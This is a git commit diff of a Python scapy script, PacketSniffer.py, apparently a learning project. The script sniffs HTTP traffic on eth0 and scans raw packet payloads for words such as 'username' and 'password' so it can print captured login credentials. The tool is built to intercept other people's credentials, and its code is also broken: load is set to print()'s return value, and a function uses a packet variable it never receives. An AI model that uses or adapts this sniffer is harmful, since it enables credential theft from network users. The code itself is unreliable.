de467ae02091d04e8a0cc0078874a984061559ca
Paul St. Amour <paul35444@aol.com>
2021-03-12 11:16:12 -0600

    -created get_login_info func -moved login info loops from process_sniffed_packet to get_login_info func

--- PacketSniffer.py
+++ PacketSniffer.py
@@ -11,22 +11,23 @@ def sniff(interface):
 def get_url(packet):
     return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
 
+def get_login_info(packet):
+#only displaying packets with Raw layer
+    if packet.haslayer(scapy.Raw):
+#scapy.Raw will only print the raw layer of the packet no additional info
+#.load will only print load info from raw layer
+        load = print(packet[scapy.Raw].load)
+        keywords = ["username", "user", "login", "password", "pass"]
+        for keyword in keywords:
+            if keyword in load:
+                print("\n\n[+] Possible username/password >> " + load + "\n\n")
+                break
+
 def process_sniffed_packet():
 #print only HTTPRequest packets
     if packet.haslayer(http.HTTPRequest):
         url = get_url(packet)
         print("[+] HTTP Request >> " + url)
-
-#only displaying packets with Raw layer
-        if packet.haslayer(scapy.Raw):
-#scapy.Raw will only print the raw layer of the packet no additional info
-#.load will only print load info from raw layer
-            load = print(packet[scapy.Raw].load)
-            keywords = ["username", "user", "login", "password", "pass"]
-            for keyword in keywords:
-                if keyword in load:
-                    print("\n\n[+] Possible username/password >> " + load + "\n\n")
-                    break
 
 #sniff interface (hardcoded)
 sniff("eth0")
